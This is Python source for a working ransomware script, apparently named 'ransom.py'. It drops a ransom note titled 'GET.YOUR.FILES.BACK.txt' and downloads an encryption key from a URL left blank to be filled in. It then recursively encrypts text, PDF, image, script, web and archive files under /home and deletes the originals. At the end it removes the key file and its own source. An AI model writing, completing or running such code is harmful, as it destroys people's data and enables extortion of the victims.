import glob
from cryptography.fernet import Fernet
import os
import requests
ransom_message = '''your message'''
ransom_message_txt = open("GET.YOUR.FILES.BACK.txt", 'w')
ransom_message_txt.write(ransom_message)
ransom_message_txt.close()
session = requests.session()
url = ('')
response = session.get(url, allow_redirects=True)
with open('mykey.key', 'wb') as enckey:
    enckey.write(response.content)

with open('mykey.key', 'rb') as mykey:
    key = mykey.read()
    f = Fernet(key)
for filename in glob.iglob('/home/**/*.txt', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.pdf', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.sh', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.jpg', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.jpeg', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.png', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.gif', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.php', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.html', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.gz', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.zip', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
for filename in glob.iglob('/home/**/*.js', recursive=True):
    with open(filename, 'rb') as file:
        print(filename)
    with open(filename, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)
    with open(filename + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
        os.remove(filename)
os.remove('mykey.key')
os.remove('ransom.py')

